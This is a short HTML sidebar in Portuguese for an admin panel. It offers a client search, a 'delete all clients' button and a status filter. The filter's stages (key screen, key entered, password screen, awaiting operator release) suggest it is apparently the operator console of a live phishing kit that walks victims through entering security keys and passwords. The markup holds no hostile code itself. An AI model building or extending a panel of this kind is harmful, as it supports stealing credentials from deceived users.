<div class="sidebar d-none d-md-block">
    <h5>Ferramentas Admin</h5>
    <div class="form-check form-switch">
        <input class="form-check-input" type="checkbox" id="themeToggle">
        <label class="form-check-label" for="themeToggle">Modo Claro</label>
    </div>
    <input type="text" id="searchInput" class="form-control mb-2" placeholder="🔍 Buscar por nome...">
    <select id="filterStatus" class="form-select">
        <option value="">Todos os Status</option>
        <option value="guest">🏠 Na Home</option>
        <option value="chat">💬 No Chat</option>
        <option value="pending">🕒 Aguardando liberação</option>
        <option value="authorized">📲 Na tela de chave</option>
        <option value="aguardando_key">🔑 Chave informada</option>
        <option value="key_authorized">🔒 Na tela de senha</option>
        <option value="aguardando_password">⌛ Aguardando liberação final</option>
        <option value="password_authorized">✅ Finalizado</option>
        <option value="rejected">❌ Rejeitado</option>
    </select>
    <hr style="border-color:var(--border);margin-top:1.5rem;margin-bottom:1.5rem;">
    <form method="post" action="delete_all_clients.php"
          onsubmit="return confirm('TEM CERTEZA? Esta ação é irreversível e irá apagar TODOS os clientes.');">
        <button type="submit" class="btn-excluir-todos">Excluir Todos os Clientes</button>
    </form>
</div>